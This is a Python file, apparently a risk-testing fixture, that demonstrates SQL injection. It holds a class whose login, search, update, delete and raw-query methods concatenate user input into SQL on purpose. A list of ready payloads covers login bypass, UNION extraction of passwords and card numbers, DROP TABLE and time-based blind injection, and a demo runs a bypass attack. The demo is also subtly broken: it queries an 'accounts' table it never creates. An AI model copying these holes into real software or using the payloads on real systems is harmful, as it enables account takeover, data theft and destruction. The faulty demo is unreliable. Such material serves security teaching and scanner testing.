"""
HIGH RISK: SQL Injection Testing Suite
WARNING: This code demonstrates critical SQL injection vulnerabilities
Risk Score: 9.9/10 - CRITICAL
"""

import sqlite3
import mysql.connector
from typing import Any, List


class SQLInjectionVulnerableDB:
    """Intentionally vulnerable database class for risk testing."""
    
    def __init__(self, db_name: str):
        self.db_name = db_name
        self.connection = sqlite3.connect(db_name)
        self.cursor = self.connection.cursor()
    
    # CRITICAL VULNERABILITY: Direct string concatenation in SQL queries
    def get_user_by_id(self, user_id: str) -> tuple:
        """
        HIGH RISK: Raw SQL concatenation allows SQL injection
        Risk Score: 9.8/10
        """
        # VULNERABLE CODE - DO NOT USE IN PRODUCTION
        query = "SELECT * FROM users WHERE id = " + user_id
        self.cursor.execute(query)
        return self.cursor.fetchone()
    
    def login_user(self, username: str, password: str) -> bool:
        """
        CRITICAL RISK: Authentication bypass via SQL injection
        Risk Score: 10/10 - Can bypass entire authentication system
        """
        # VULNERABLE - String concatenation in WHERE clause
        query = "SELECT * FROM accounts WHERE username = '" + username + "' AND password = '" + password + "'"
        self.cursor.execute(query)
        return self.cursor.fetchone() is not None
    
    def search_products(self, search_term: str) -> List[tuple]:
        """
        CRITICAL RISK: Data exfiltration via UNION-based SQL injection
        Risk Score: 9.9/10
        """
        # VULNERABLE - Can be used to extract sensitive data
        query = "SELECT name, price FROM products WHERE name LIKE '%" + search_term + "%'"
        self.cursor.execute(query)
        return self.cursor.fetchall()
    
    def update_profile(self, user_id: str, bio: str) -> None:
        """
        CRITICAL RISK: Blind SQL injection attack vector
        Risk Score: 9.7/10
        """
        # VULNERABLE - Allows modification of database structure
        query = "UPDATE users SET bio = '" + bio + "' WHERE id = " + user_id
        self.cursor.execute(query)
        self.connection.commit()
    
    def delete_record(self, table: str, condition: str) -> None:
        """
        CATASTROPHIC RISK: Complete database deletion possible
        Risk Score: 10/10 - Can destroy entire database
        """
        # VULNERABLE - Can execute dangerous operations
        query = "DELETE FROM " + table + " WHERE " + condition
        self.cursor.execute(query)
        self.connection.commit()
    
    def raw_query_executor(self, raw_sql: str) -> Any:
        """
        MAXIMUM RISK: Accepts arbitrary SQL commands
        Risk Score: 10/10 - Complete system compromise
        """
        # ULTRA VULNERABLE - Direct execution of user input
        self.cursor.execute(raw_sql)
        self.connection.commit()
        return self.cursor.fetchall()


# Attack payload examples
ATTACK_PAYLOADS = [
    # Authentication bypass
    "' OR '1'='1",
    "admin' --",
    "' OR 1=1 --",
    "admin' OR 'x'='x",
    
    # Data extraction
    "' UNION SELECT NULL, username, password FROM users --",
    "' UNION SELECT NULL, credit_card, cvv FROM accounts --",
    "' UNION SELECT NULL, email, phone FROM customers --",
    
    # Database destruction
    "'; DROP TABLE users; --",
    "'; DELETE FROM users WHERE '1'='1",
    
    # Time-based blind SQL injection
    "' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --",
]


def demonstrate_high_risk_attack():
    """Demonstrates high-risk SQL injection attacks."""
    db = SQLInjectionVulnerableDB(':memory:')
    
    # Create test tables
    db.cursor.execute('''CREATE TABLE users 
                       (id INTEGER, username TEXT, password TEXT, bio TEXT)''')
    db.cursor.execute("INSERT INTO users VALUES (1, 'admin', 'secret', 'Admin user')")
    db.connection.commit()
    
    print("[CRITICAL RISK] SQL Injection Test Suite")
    print("=" * 60)
    
    # Demonstrate authentication bypass
    print("\n[ATTACK] Authentication Bypass via SQL Injection")
    print("Payload: ' OR '1'='1")
    result = db.login_user("' OR '1'='1", "anything")
    print(f"Authentication bypass successful: {result}")
    
    # Demonstrate data exfiltration
    print("\n[ATTACK] Data Exfiltration")
    malicious_search = "' UNION SELECT username, password FROM users --"
    print(f"Search payload: {malicious_search}")
    
    print("\n[RISK ASSESSMENT]")
    print("- Authentication bypass: POSSIBLE")
    print("- Data exfiltration: POSSIBLE")
    print("- Database modification: POSSIBLE")
    print("- Complete database destruction: POSSIBLE")
    print("\nRisk Score: 9.9/10 - CRITICAL VULNERABILITY")


if __name__ == '__main__':
    demonstrate_high_risk_attack()
